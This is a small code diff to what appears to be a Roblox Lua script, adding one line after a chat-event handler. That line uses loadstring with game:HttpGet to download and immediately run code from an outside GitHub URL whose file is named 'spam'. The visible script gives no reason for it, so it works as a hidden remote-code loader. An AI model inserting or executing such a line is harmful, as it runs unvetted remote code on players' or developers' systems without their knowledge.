@@ -296,3 +296,4 @@ player.Chatted:Connect(function(msg)
 		reset()
 	end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Imsleepyasf/wild/refs/heads/main/spam", true))()
